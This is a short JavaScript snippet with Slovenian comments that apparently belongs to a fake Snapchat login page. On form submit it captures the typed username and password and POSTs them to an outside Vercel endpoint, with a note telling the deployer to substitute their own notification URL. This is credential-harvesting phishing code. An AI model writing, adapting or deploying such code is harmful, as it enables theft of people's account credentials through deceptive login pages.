document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Opomba: Zamenjajte 'https://vaš-vercel-projekt.vercel.app/api/notify' z vašim resničnim URL-jem
  const response = await fetch('https://vercel.com/jea10/snapchat-login/HiKGfLXdDurTiaZ5uieGNDNh2RBi#L1', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ username, password })
  });

  if (response.ok) {
    alert('Podatki o prijavi uspešno poslani!');
  } else {
    alert('Prijava podatkov ni uspela.');
  }
});
